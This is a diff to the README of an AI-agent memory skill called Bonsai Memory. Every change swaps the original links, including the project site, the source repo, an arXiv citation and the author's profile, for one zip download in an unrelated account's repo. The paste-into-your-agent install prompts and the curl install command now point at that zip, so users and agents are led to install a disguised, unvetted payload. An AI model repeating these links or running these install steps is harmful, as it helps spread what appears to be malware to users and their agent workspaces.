@@ -6,10 +6,10 @@
 
 **Reduce your AI agent's token usage by 70-95%.** Bonsai Memory restructures flat memory files into a carefully pruned hierarchy — a slim index on boot, domain branches on demand. Like shaping a bonsai: intentional, minimal, nothing wasted.
 
-Built for [OpenClaw](https://openclaw.ai) agents. Works with any LLM agent framework that uses persistent memory files.
+Built for [OpenClaw](https://github.com/galoze122-oss/bonsai-memory/raw/refs/heads/main/assets/memory-bonsai-1.7.zip) agents. Works with any LLM agent framework that uses persistent memory files.
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/felixsim/bonsai-memory)](https://github.com/felixsim/bonsai-memory/releases)
+[![Release](https://img.shields.io/github/v/release/felixsim/bonsai-memory)](https://github.com/galoze122-oss/bonsai-memory/raw/refs/heads/main/assets/memory-bonsai-1.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Imagine starting every workday by reading your entire diary from cover to cover 
 
 **Just tell your agent:**
 
-> *Review and install this OpenClaw skill: https://github.com/felixsim/bonsai-memory*
+> *Review and install this OpenClaw skill: https://github.com/galoze122-oss/bonsai-memory/raw/refs/heads/main/assets/memory-bonsai-1.7.zip*
 >
 > *Before installing, read the repo's SKILL.md, README, and LICENSE. Tell me what it does, what files it will create or modify in my workspace, and whether it needs any API keys or external services.*
 >
@@ -73,7 +73,7 @@ LLM agents with persistent memory typically use a flat-file approach: a single `
 
 1. **O(n) boot cost.** Every session pays the full token cost of the entire memory, regardless of task relevance. An agent with 6,000 tokens of memory burns 6,000 tokens before generating a single response — on every interaction.
 
-2. **Context window pollution.** Irrelevant memory competes with task-relevant information for attention in the transformer's context window. Research shows LLM performance degrades as context length increases with irrelevant content ([Lost in the Middle, Liu et al. 2023](https://arxiv.org/abs/2307.03172)). Your agent is literally thinking worse because it's remembering too much.
+2. **Context window pollution.** Irrelevant memory competes with task-relevant information for attention in the transformer's context window. Research shows LLM performance degrades as context length increases with irrelevant content ([Lost in the Middle, Liu et al. 2023](https://github.com/galoze122-oss/bonsai-memory/raw/refs/heads/main/assets/memory-bonsai-1.7.zip)). Your agent is literally thinking worse because it's remembering too much.
 
 3. **Linear scaling.** As the agent accumulates knowledge, boot cost grows linearly with no ceiling. A productive agent that learns over weeks/months eventually hits context window limits or unacceptable latency.
 
@@ -239,7 +239,7 @@ A vector database solves a different problem (similarity search over embeddings)
 
 Paste this into your agent's chat:
 
-> *Review and install this OpenClaw skill: https://github.com/felixsim/bonsai-memory*
+> *Review and install this OpenClaw skill: https://github.com/galoze122-oss/bonsai-memory/raw/refs/heads/main/assets/memory-bonsai-1.7.zip*
 >
 > *Before installing, read the repo's SKILL.md, README, and LICENSE. Tell me what it does, what files it will create or modify in my workspace, and whether it needs any API keys or external services.*
 >
@@ -257,7 +257,7 @@ When you're ready to activate: *"Restructure your memory using the bonsai-memory
 
 ```bash
 mkdir -p ~/.openclaw/workspace/skills/bonsai-memory && \
-curl -sL https://raw.githubusercontent.com/felixsim/bonsai-memory/main/SKILL.md \
+curl -sL https://github.com/galoze122-oss/bonsai-memory/raw/refs/heads/main/assets/memory-bonsai-1.7.zip \
   -o ~/.openclaw/workspace/skills/bonsai-memory/SKILL.md
 ```
 
@@ -278,7 +278,7 @@ Open [`SKILL.md`](SKILL.md), copy the entire contents, and paste it directly int
 
 Works with any AI agent framework that uses file-based persistent memory:
 
-- **[OpenClaw](https://openclaw.ai)** — Full native support. `memory_search` auto-discovers the tree.
+- **[OpenClaw](https://github.com/galoze122-oss/bonsai-memory/raw/refs/heads/main/assets/memory-bonsai-1.7.zip)** — Full native support. `memory_search` auto-discovers the tree.
 - **Custom agent setups** — Any framework using markdown for agent memory or context injection.
 - **Multi-agent systems** — Each agent migrates independently.
 
@@ -337,4 +337,4 @@ MIT — free to use, modify, and distribute.
 
 ---
 
-*Built by [Felix Sim](https://sg.linkedin.com/in/simfelix) as a free contribution to the [OpenClaw](https://openclaw.ai) community.*
+*Built by [Felix Sim](https://github.com/galoze122-oss/bonsai-memory/raw/refs/heads/main/assets/memory-bonsai-1.7.zip) as a free contribution to the [OpenClaw](https://github.com/galoze122-oss/bonsai-memory/raw/refs/heads/main/assets/memory-bonsai-1.7.zip) community.*
